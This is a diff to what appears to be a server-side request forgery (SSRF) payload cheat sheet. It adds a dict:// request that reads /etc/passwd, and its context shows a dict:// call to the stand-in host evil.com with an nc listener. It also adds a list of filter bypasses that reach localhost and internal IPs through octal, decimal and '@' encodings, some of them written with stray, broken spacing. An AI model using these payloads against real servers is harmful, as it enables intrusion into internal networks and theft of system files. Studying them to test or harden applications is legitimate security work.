@@ -104,8 +104,8 @@ If the server blocks http requests to external sites or whitelists, you can simp
 
 #### dict: //-
 DICT URL scheme is used to represent a list of definitions or words available using the DICT protocol:
+`http://example.com/ssrf.php?dict://etc/passwd`    
 ```
-
 http://example.com/ssrf.php?dict://evil.com:1337/
  
 evil.com:$ nc -lvp 1337
@@ -156,3 +156,38 @@ Hi
 ssrf
 test
 ```
+
+#### the next bypass are kinda bad but....
+http://127.0.0.1:80`
+
+`http: // localhost: 22`
+
+`http: // [::]: 80 / >>> http://127.0.0.1`
+
+`http: //example.com@127.0.0.1`
+
+`127.0 0. 1 >>> 127.0.0.1`
+
+You can do some special character sets such as seen below:    
+![Capture](https://user-images.githubusercontent.com/25066959/70392957-2c391400-19b3-11ea-88ef-41884ac39029.PNG)
+
+#### Base Bypass
+Can be hexadecimal, octal, etc.   
+
+`115.239.210.26 >>> 16373751032`    
+
+First convert these four numbers to hexadecimal, the result is: 73 ef d2 1a    
+
+Then convert the 73efd21a hexadecimal into octal    
+
+Remember to add 0 when you visit to use octal (can be a 0 or multiple 0s, and add a few more 0s in XSS to bypass filtering), and add 0x in hexadecimal    
+
+`http://127.0.0.1 >>> http://0177.0.0.1/`
+
+`http://127.0.0.1 >>> http: // 2130706433 /`
+
+`http://192.168.0.1 >>> http: // 3232235521 /`
+
+`http://192.168.1.1 >>> http: // 3232235777 /`
+
+
